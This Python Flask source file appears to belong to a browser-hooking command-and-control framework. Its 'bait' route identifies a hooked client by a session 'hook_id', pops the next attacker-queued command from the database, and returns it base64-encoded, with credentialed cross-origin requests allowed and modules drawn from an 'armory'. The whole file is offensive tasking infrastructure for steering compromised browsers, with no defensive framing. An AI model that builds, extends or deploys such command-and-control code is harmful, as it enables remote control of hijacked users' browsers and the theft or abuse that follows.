from flask import Blueprint, session, jsonify, abort
from flask_cors import cross_origin
import base64
from api.extensions import db
from .models import Command
from ..armory.parsers import Module


bp = Blueprint('command', __name__)

@bp.route('/')
@cross_origin(supports_credentials=True)
def bait():
    from api.server import app
    print(session.items())
    hook_id = session.get('hook_id')
    if not hook_id:
        abort(403)

    command_row = Command.query.filter(Command.hook_id == hook_id).first()
    if not command_row:
        app.logger.info("No commands found in the database")
        abort(404)
    
    # Retrieve the command attribute
    command_value = command_row.command

    # Delete the first Command object from the database
    db.session.delete(command_row)
    db.session.commit()

    app.logger.info(f"Retrieved and deleted the first command: {command_value}")

    if Module.has_value(command_value):
        return jsonify(command=Module.b64_encode(command_value))

    return jsonify(command=base64.b64encode(command_value.encode()).decode())